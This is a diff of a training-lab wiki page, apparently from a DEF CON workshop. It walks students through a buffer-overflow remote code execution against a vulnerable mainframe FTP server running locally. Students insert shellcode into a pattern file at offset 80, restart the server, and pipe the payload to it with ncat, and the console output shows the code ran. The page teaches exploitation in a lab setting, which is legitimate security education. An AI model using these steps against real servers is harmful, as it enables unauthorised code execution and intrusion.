@@ -1,5 +1,5 @@
 created: 20220804223858219
-modified: 20220804225526502
+modified: 20220805232014850
 tags: 
 title: Lab 15 - RCE
 type: text/vnd.tiddlywiki
@@ -9,26 +9,34 @@ type: text/vnd.tiddlywiki
 # The last lab created the file `shellcode.bin`, open that file with your hex editor: `okteta shellcode.bin`
 # Select all the bytes in the file, and copy them
 # Open the pattern file `pattern5` with your hex editor: `okteta pattern5` 
-# In pattern 5 search for `Ae2A`. Replace it (and the other bytes) with the bytes you copied from shellcode.bin
+# In pattern5 search for `Ae2A` (offset `80`). Replace it (and the other bytes) with the bytes you copied from shellcode.bin
 # Save this file as `pattern6`
 
-It should look something like this:
+It should look like this:
 
-[img[Screenshot_2022-08-04_15-46-24.png]]
+[img[rceoverflow.png]]
 
 !! Exploit!
 
-Your FTP server should still be running on port 2126, time to exploit the FTP server and run our shell code
+Your FTP server is still be running on port 2126, we need to reset it. 
+
+# On the Command line in http://localhost:8888 (Username/password: `defcon`) send `/stop ftpddc30`
+# Then `/start ftpddc30,srvport=2126` 
 
 # Exploit: `cat pattern6 | ncat -v -w1 localhost 2126`
 
-If you look now at the output from the master console you can see our code executed
+If you look now at the output from the master console you can see our code executed (you may need to turn on the Auto Refresh)
 
 ```
-/ +FTP00GI Connection from 172.17.0.1 - 17.44.10 2022/08/04
-/ +WTO
-/ IEF404I FTPDDC30 - ENDED - TIME=17.44.10
+/ +FTP00GI Connection from 172.17.0.1 - 17.53.27 2022/08/05
+/ +RINGRING
+/ IEF404I FTPDDC30 - ENDED - TIME=17.53.27
+/ $HASP395 FTPDDC30 ENDED
 ```
+
+Or from the job log
+
+[img[joblog.png]]
 
 Congrats! You've done a mainframe RCE! You're part of a small handful of people in the world who could do this!
 
